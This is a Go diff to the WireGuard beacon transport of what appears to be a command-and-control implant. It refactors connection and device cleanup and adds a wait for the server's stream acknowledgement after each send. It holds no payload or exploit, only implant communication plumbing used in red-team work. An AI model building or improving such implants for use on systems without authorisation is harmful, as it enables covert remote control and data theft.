@@ -325,8 +325,9 @@ func wgBeacon(uri *url.URL) *Beacon {
 				return err
 			}
 			if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
-				_ = conn.Close()
-				_ = dev.Down()
+				closeWGBeaconResources(nil, conn, dev)
+				conn = nil
+				dev = nil
 				return err
 			}
 			cfg := yamux.DefaultConfig()
@@ -339,8 +340,9 @@ func wgBeacon(uri *url.URL) *Beacon {
 			// {{end}}
 			muxSession, err = yamux.Client(conn, cfg)
 			if err != nil {
-				_ = conn.Close()
-				_ = dev.Down()
+				closeWGBeaconResources(nil, conn, dev)
+				conn = nil
+				dev = nil
 				return err
 			}
 			return nil
@@ -354,26 +356,13 @@ func wgBeacon(uri *url.URL) *Beacon {
 			return wireguard.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			stream, err := muxSession.Open()
-			if err != nil {
-				return err
-			}
-			defer stream.Close()
-			return wireguard.WriteEnvelope(stream, envelope)
+			return sendWGBeaconEnvelope(muxSession, envelope)
 		},
 		Close: func() error {
-			if muxSession != nil {
-				_ = muxSession.Close()
-				muxSession = nil
-			}
-			if conn != nil {
-				_ = conn.Close()
-				conn = nil
-			}
-			if dev != nil {
-				_ = dev.Down()
-				dev = nil
-			}
+			closeWGBeaconResources(muxSession, conn, dev)
+			muxSession = nil
+			conn = nil
+			dev = nil
 			return nil
 		},
 		Cleanup: func() error {
@@ -381,6 +370,71 @@ func wgBeacon(uri *url.URL) *Beacon {
 		},
 	}
 	return beacon
+}
+
+// closeWGBeaconResources permanently closes each per-check-in resource. A
+// device.Down only stops the bind and peers; it leaves the netstack TUN and
+// WireGuard worker goroutines alive, so beacon reconnects must use Close.
+func closeWGBeaconResources(muxSession *yamux.Session, conn net.Conn, dev *device.Device) {
+	if muxSession != nil {
+		_ = muxSession.Close()
+	}
+	if conn != nil {
+		_ = conn.Close()
+	}
+	if dev != nil {
+		closeWGBeaconDevice(dev.Close)
+	}
+}
+
+func closeWGBeaconDevice(closeDevice func()) {
+	if closeDevice != nil {
+		closeDevice()
+	}
+}
+
+const wgBeaconStreamReceiptTimeout = 5 * time.Second
+
+func sendWGBeaconEnvelope(muxSession *yamux.Session, envelope *pb.Envelope) error {
+	if envelope == nil {
+		return errors.New("[wg] nil beacon envelope")
+	}
+	return sendWGBeaconStream(muxSession, wgBeaconStreamReceiptTimeout, func(stream net.Conn) error {
+		return wireguard.WriteEnvelope(stream, envelope)
+	})
+}
+
+// sendWGBeaconStream waits for the peer's FIN after writing the request. A
+// successful yamux write only means the frame reached the local transport; the
+// remote FIN proves the server read the complete request before the beacon
+// tears down the WireGuard session.
+func sendWGBeaconStream(muxSession *yamux.Session, receiptTimeout time.Duration, write func(net.Conn) error) error {
+	if muxSession == nil {
+		return errors.New("[wg] send called with nil yamux session")
+	}
+	if receiptTimeout <= 0 {
+		return errors.New("[wg] invalid beacon stream receipt timeout")
+	}
+	stream, err := muxSession.Open()
+	if err != nil {
+		return err
+	}
+	if isNilInterface(stream) {
+		return errors.New("[wg] open returned nil stream")
+	}
+	defer func() { _ = stream.Close() }()
+
+	if err := write(stream); err != nil {
+		return err
+	}
+	if err := stream.SetReadDeadline(time.Now().Add(receiptTimeout)); err != nil {
+		return err
+	}
+	if err := stream.Close(); err != nil {
+		return err
+	}
+	_, err = io.Copy(io.Discard, stream)
+	return err
 }
 
 // {{end}}
